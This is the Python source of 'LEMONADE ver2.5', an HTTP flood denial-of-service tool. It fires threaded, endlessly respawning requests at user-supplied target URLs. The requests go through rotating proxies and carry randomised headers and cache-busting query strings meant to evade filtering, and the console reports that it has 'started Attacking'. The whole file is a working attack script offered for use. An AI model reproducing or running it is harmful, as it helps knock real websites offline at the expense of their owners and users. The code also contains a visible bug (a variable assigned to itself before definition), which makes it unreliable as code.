import threading
import random
import json
import re
import requests
import sys
import time
import os
import string

try:
    from colorama import Fore
except:
    print("coloramaモジュールが見つかりませんでした。\npip install colorama してインストールしてください")
    os.system("pause")
    os._exit(0)

try:
    from dictknife import deepmerge
except:
    print("dictknifeモジュールが見つかりませんでした。\npip install dictknife してインストールしてください")
    os.system("pause")
    os._exit(0)

os.system("cls")
os.system("title LEMONADE ver2.5")
time.sleep(0.5)
print(f"""{Fore.LIGHTYELLOW_EX}






                        ██      ███████ ███    ███  ██████  ███    ██  █████  ██████  ███████ 
                        ██      ██      ████  ████ ██    ██ ████   ██ ██   ██ ██   ██ ██      
                        ██      █████   ██ ████ ██ ██    ██ ██ ██  ██ ███████ ██   ██ █████   
                        ██      ██      ██  ██  ██ ██    ██ ██  ██ ██ ██   ██ ██   ██ ██      
                        ███████ ███████ ██      ██  ██████  ██   ████ ██   ██ ██████  ███████ {Fore.RESET}
                                                    {Fore.LIGHTMAGENTA_EX}version 2.5{Fore.RESET}   {Fore.RESET}



""")
with open("./config.json","r") as f:
    config = json.load(f);


url = ""
host = ""
useragents = []
referers = []
request_counter = 0

flag = 0

def set_flag(num):
    global flag
    flag = num

def isignorestatus(statscode):
    global config
    if config["safemode"] == True:
        for i in config["ignorestatuscode"]:
            if i == statscode:
                return True
    return False

def requestcnt():
    global request_counter
    request_counter += 1

def useragent_list():
    global config
    global useragents
    with open(config["useragents"],"r") as f:
        useragent = f.read().split("\n")
    useragents = useragent
    return useragent

def referer_list():
    global config
    global referers
    with open(config["referers"],"r") as f:
        referer = f.read().split("\n")
    referers = referer
    return referer

def buildblock(size):
    out_str = ""
    for _ in range(size):
        out_str += random.choice(string.ascii_letters)
    return out_str

langcode = ["aa","ab","af","ak","sq","am","ar","an","hy","as","av","ae","ay","az","ba","bm","eu","be","bn","bh","bi","bs","br","bg","my","ca","ch","ce","zh","zh-CN","zh-TW","cu","cv","kw","co","cr","cs","da","dv","nl","dz","en","en-US","en-GB","en-CA","en-AU","eo","et","ee","fo","fj","fi","fr","fr-CA","fy","ff","ka","de","gd","ga","gl","gv","el","gn","gu","ht","ha","he","hz","hi","ho","hu","ig","is","io","ii","iu","ie","ia","id","ik","it","jv","ja","kl","kn","ks","kr","kk","km","ki","rw","ky","kv","kg","ko","kj","ku","lo","la","lv","li","ln","lt","lb","lu","lg","mk","mh"]
def lang():
    global langcode
    return random.choice(langcode)
if(config["useconfigurl"] == False):
    url = []
    url.append(input("                            URL:"))
    if str(url[0]).count("/")==2:
        url[0] = url[0] + "/"
    m = re.search('(https?\://)?([^/]*)/?.*', url[0])
    host = []
    host.append(m.group(2))
else:
    url = config["url"]
    for i in range(len(url)):
        k = url[i]
        if str(k).count("/")==2:
            k = k + "/"
    host = []
    for i in range(len(url)):
        m = re.search('(https?\://)?([^/]*)/?.*', url[i])
        host.append(m.group(2))

thrd = int(input("                            Thread Count:"))
if thrd > config["thread"]["maxthreads"] and config["thread"]["limiter"] == True:
    thrd = config["thread"]["maxthreads"]

with open(config["proxies"],"r") as f:
    proxies = f.read().split("\n")

useragent_list()
referer_list()

for hosta in host:
    referers.append(f"https://{hosta}/")

class httpcall(threading.Thread):
    def __init__(self):
        global config
        threading.Thread.__init__(self)
        self.randomdelay = config["thread"]["randomdelay"]
        self.payload = json.dumps(config["payload"])
        self.useragents = useragents
        self.referers = referers
        self.limiter = config["thread"]["limiter"]
        self.mindelay = int(config["thread"]["mindelay"])
        self.maxdelay = int(config["thread"]["maxdelay"])
        self.method = str(config["method"]).lower()
        self.timeout = int(config["thread"]["timeout"])
        self.normaldelay = int(config["thread"]["normaldelay"])
        self.usenormaldelay = config["thread"]["usenormaldelay"]
        self.nodelay = config["thread"]["nodelay"]
        self.usepayload = config["usepayload"]
        self.head = config["headers"]
        
        self.useproxies = config["useproxies"]
        self.limiter = config["thread"]["limiter"]
    def run(self):
        global proxies
        global url
        global host
        for __ in range(5):
            for k in range(len(url)):
                try:
                    useurl = url[k]
                    usehost = usehost
                    proxy = ""
                    if self.useproxies == True:
                        proxy = proxies.pop(0)
                    if useurl.count("?") > 0:
                        param_joiner = "&"
                    else:
                        param_joiner = "?"
                except IndexError:
                    continue
                langcodea = lang()
                contentencodings = ["gzip","compress","identity","deflate","br"]
                contenttypes = ["text/plain","application/json","text/csv","application/pdf","application/zip","application/xslm","text/css"]
                accepts = [f"text/html,{random.choice(contenttypes)},{random.choice(contenttypes)},{random.choice(contenttypes)};q=0.{random.randint(4,9)}",f"*/*;q=0.{random.randint(4,9)}","*/*"]
                acceptcharset = ["ISO-8859-1","shift-jis","US-ASCII","utf-8"]
                tmp = []
                tmp.append({
                    "Accept":random.choice(accepts),
                    "User-Agent": random.choice(self.useragents),
                    "Cache-Control": "no-cache",
                    "Accept-Encoding": random.choice(contentencodings),
                    "Accept-Charset": f"{random.choice(acceptcharset)};q=0.7,*;q=0.7",
                    "Origin":f"https://{usehost}",
                    "Referer": random.choice(self.referers) + buildblock(random.randint(5,10)),
                    "Keep-Alive": str(random.randint(110,120)),
                    "Accept-Language": f"{langcodea},{langcodea};q=0.{random.randint(4,9)}",
                    "Connection": "keep-alive",
                    "Host": usehost
                })
                tmp.append({
                    "Accept": random.choice(accepts),
                    "User-Agent": random.choice(self.useragents),
                    "Cache-Control": "no-cache",
                    "Accept-Charset": f"{random.choice(acceptcharset)};q=0.7,*;q=0.7",
                    "Accept-Encoding": random.choice(contentencodings),
                    "content-type": random.choice(contenttypes),#
                    "Referer": random.choice(self.referers) + buildblock(random.randint(5,10)),
                    "Keep-Alive": str(random.randint(110,120)),
                    "Accept-Language": f"{langcodea},{langcodea};q=0.{random.randint(4,9)}",
                    "Connection": "keep-alive",
                    "Host": usehost
                })
                tmp.append({
                    "Accept": random.choice(accepts),
                    "User-Agent": random.choice(self.useragents),
                    "Cache-Control": "no-cache",
                    "Accept-Charset": f"{random.choice(acceptcharset)};q=0.7,*;q=0.7",
                    "content-type": random.choice(contenttypes),#
                    "Referer": random.choice(self.referers) + buildblock(random.randint(5,10)),
                    "Keep-Alive": str(random.randint(110,120)),
                    "Accept-Language": f"{langcodea},{langcodea};q=0.{random.randint(4,9)}",
                    "Connection": "keep-alive"
                })
                tmp.append({
                    "Accept": random.choice(accepts),
                    "User-Agent": random.choice(self.useragents),
                    "Cache-Control": "no-cache",
                    "Accept-Charset": f"{random.choice(acceptcharset)};q=0.7,*;q=0.7",
                    "Accept-Encoding": random.choice(contentencodings),
                    "Origin":f"https://{usehost}",
                    "content-type": random.choice(contenttypes),#
                    "Referer": random.choice(self.referers) + buildblock(random.randint(5,10)),
                    "Accept-Language": f"{langcodea},{langcodea};q=0.{random.randint(4,9)}",
                    "Host": usehost
                })
                tmp.append({
                    "Accept": random.choice(accepts),
                    "User-Agent": random.choice(self.useragents),
                    "Cache-Control": "no-cache",
                    "Accept-Charset": f"{random.choice(acceptcharset)};q=0.7,*;q=0.7",
                    "Origin":f"https://{usehost}",
                    "content-type": random.choice(contenttypes),#
                    "Referer": random.choice(self.referers) + buildblock(random.randint(5,10)),
                    "Accept-Language": f"{langcodea},{langcodea};q=0.{random.randint(4,9)}"
                })
                header = deepmerge(random.choice(tmp),self.head)
                if proxy == "":
                    try:
                        if self.usepayload == True:
                            lres = requests.request(
                                self.method,
                                f"{useurl}{param_joiner}{buildblock(random.randint(3,10))}={buildblock(random.randint(3,10))}",
                                headers=header,
                                data=self.payload,
                                timeout=self.timeout
                                )
                        else:
                            lres = requests.request(
                                self.method,
                                f"{useurl}{param_joiner}{buildblock(random.randint(3,10))}={buildblock(random.randint(3,10))}",
                                headers=header,
                                timeout=self.timeout
                                )
                        #print(lres.text)
                        #proxies.append(proxy)
                    except Exception as e:
                        #print(e)
                        if len(url) == 0:
                            set_flag(2)
                        continue
                else:
                    try:
                        if self.usepayload == True:
                            lres = requests.request(
                                self.method,
                                f"{useurl}{param_joiner}{buildblock(random.randint(3,10))}={buildblock(random.randint(3,10))}",
                                headers=header,
                                data=self.payload,
                                timeout=self.timeout,
                                proxies={
                                    "http":"http://"+proxy,
                                    "https":"http://"+proxy,
                            })
                        else:
                            lres = requests.request(
                                self.method,
                                f"{useurl}{param_joiner}{buildblock(random.randint(3,10))}={buildblock(random.randint(3,10))}",
                                headers=header,
                                timeout=self.timeout,
                                proxies={
                                    "http":"http://"+proxy,
                                    "https":"http://"+proxy,
                            })
                        proxies.append(proxy)
                    except Exception as e:
                        #print(e)
                        if len(url) == 0:
                            set_flag(2)
                        continue
                if str(lres.status_code).startswith("50"):
                    set_flag(1)
                    print("                        Res 500 "+usehost)
                    s = useurl
                    b = usehost
                    url.remove(s)
                    host.remove(b)
                elif isignorestatus(lres.status_code):
                    requestcnt()
                else:
                    print("                        A request error has occurred. "+str(lres.status_code)+" at "+usehost)
                    s = useurl
                    b = usehost
                    url.remove(s)
                    host.remove(b)
            if self.nodelay == True:
                continue
            elif self.limiter == True:
                time.sleep(random.randint(600,3000) / 1000)
            elif self.randomdelay == True:
                time.sleep(random.randint(self.mindelay,self.maxdelay) / 1000)
            elif self.usenormaldelay:
                time.sleep(self.normaldelay / 1000)
            else:
                pass
        time.sleep(1)
        httpcall().start()
        return


class MonitorThread(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.beforerequestcount = 0
        self.newrequest = []
    def run(self):
        print("\n                            ")
        while True:
            time.sleep(1)
            self.newrequest.append(request_counter - self.beforerequestcount)
            allcount = 0
            for i in self.newrequest:
                allcount += i
            print(f"\033[2A\r                            Summary All:{request_counter}\n                            New Request:{request_counter - self.beforerequestcount}\n                            Average new request:{round(allcount / len(self.newrequest))}",end="")
            self.beforerequestcount = request_counter



#print(url)
#print(host)
print("                            -----------------LEMONADE started Attacking-----------------")
try:
    MonitorThread().start()
    for i in range(thrd):
        httpcall().start()
#print("Success fully started all threads")
    while True:
        #print(f"Summary Requested: {request_counter}")
        if flag == 2:
            print("\n                            -----------------LEMONADE stopped Attacking-----------------")
            os._exit(0)
        if len(url) == 0:
            print("\n                          -----------------LEMONADE stopped Attacking-----------------")
            os._exit(0)
        time.sleep(0.05)
except KeyboardInterrupt:
    print("\n                            -----------------LEMONADE stopped Attacking-----------------")
    os._exit(0)